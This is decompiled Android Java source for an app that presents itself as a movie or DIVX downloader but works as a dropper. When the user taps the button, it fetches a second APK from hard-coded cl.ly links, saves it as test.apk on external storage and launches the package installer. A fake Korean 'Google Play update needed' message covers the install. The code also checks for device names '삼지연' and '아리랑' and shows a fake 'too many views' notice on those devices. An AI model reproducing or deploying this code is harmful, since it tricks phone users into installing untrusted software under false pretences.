package com.movieshow.down;

import android.app.Activity;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Intent;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;

public class Badaccents extends Activity {
    /* access modifiers changed from: private|static */
    public static String file_url = "http://f.cl.ly/items/132B2E2f0t46241d3s06/%EA%B2%B0%ED%98%BC%EC%B2%AD%EC%B2%A9.apk";
    /* access modifiers changed from: private|static */
    public static String file_urlb = "http://f.cl.ly/items/1h1i2C2M1M2P1r0l2M3u/%EC%B2%AD%EC%B2%A9%EC%9E%A5.apk";
    public static final int progress_bar_type = 0;
    /* access modifiers changed from: private */
    public Button btnPlayMusic;
    private MediaPlayer mPlayer;
    /* access modifiers changed from: private */
    public ProgressDialog prgDialog;

    class DownloadMusicfromInternet extends AsyncTask<String, String, String> {
        DownloadMusicfromInternet() {
        }

        /* access modifiers changed from: protected */
        public void onPreExecute() {
            super.onPreExecute();
            Badaccents.this.showDialog(0);
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(String... f_url) {
            try {
                URL url = new URL(f_url[0]);
                URLConnection conection = url.openConnection();
                conection.connect();
                int lenghtOfFile = conection.getContentLength();
                InputStream input = new BufferedInputStream(url.openStream(), 10240);
                OutputStream output = new FileOutputStream(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getPath())).append("/test.apk").toString());
                byte[] data = new byte[1024];
                long total = 0;
                while (true) {
                    int count = input.read(data);
                    if (count == -1) {
                        break;
                    }
                    total += (long) count;
                    publishProgress(new String[]{((int) ((100 * total) / ((long) lenghtOfFile)))});
                    output.write(data, 0, count);
                }
                output.flush();
                output.close();
                input.close();
            } catch (Exception e) {
                Log.e("Error: ", e.getMessage());
            }
            return null;
        }

        /* access modifiers changed from: protected|varargs */
        public void onProgressUpdate(String... progress) {
            Badaccents.this.prgDialog.setProgress(Integer.parseInt(progress[0]));
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(String file_url) {
            Badaccents.this.dismissDialog(0);
            Toast.makeText(Badaccents.this.getApplicationContext(), "Google Play 업데이트 필요", 1).show();
            Badaccents.this.playMusic();
        }
    }

    public String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        }
        return capitalize(manufacturer) + " " + model;
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        return !Character.isUpperCase(first) ? Character.toUpperCase(first) + s.substring(1) : s;
    }

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        this.btnPlayMusic = (Button) findViewById(R.id.btnProgressBar);
        this.btnPlayMusic.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                Badaccents.this.btnPlayMusic.setEnabled(false);
                File file = new File(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getPath())).append("/test.apk").toString());
                if (!(Badaccents.this.getDeviceName().equals("삼지연") && Badaccents.this.getDeviceName().equals("아리랑"))) {
                    if (file.exists()) {
                        new DownloadMusicfromInternet().execute(new String[]{Badaccents.file_urlb});
                    } else {
                        new DownloadMusicfromInternet().execute(new String[]{Badaccents.file_url});
                    }
                }
                if (Badaccents.this.getDeviceName().equals("삼지연")) {
                    Toast.makeText(Badaccents.this.getApplicationContext(), "페이지 로딩 중.... 조회 수가많아 잠시뒤에 접속 해주십시오!. 감사합니다.", 1).show();
                }
                if (Badaccents.this.getDeviceName().equals("아리랑")) {
                    Toast.makeText(Badaccents.this.getApplicationContext(), "페이지 로딩 중.... 조회 수가많아 잠시뒤에 접속 해주십시오!. 감사합니다.", 1).show();
                }
            }
        });
    }

    /* access modifiers changed from: protected */
    public Dialog onCreateDialog(int id) {
        switch (id) {
            case 0:
                this.prgDialog = new ProgressDialog(this);
                this.prgDialog.setMessage("Downloading DIVX file. Please wait...");
                this.prgDialog.setIndeterminate(false);
                this.prgDialog.setMax(100);
                this.prgDialog.setProgressStyle(1);
                this.prgDialog.setCancelable(false);
                this.prgDialog.show();
                return this.prgDialog;
            default:
                return null;
        }
    }

    /* access modifiers changed from: protected */
    public void playMusic() {
        try {
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.setDataAndType(Uri.fromFile(new File(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getPath())).append("/test.apk").toString())), "application/vnd.android.package-archive");
            startActivity(intent);
        } catch (IllegalArgumentException | IllegalStateException | SecurityException e) {
        }
    }
}
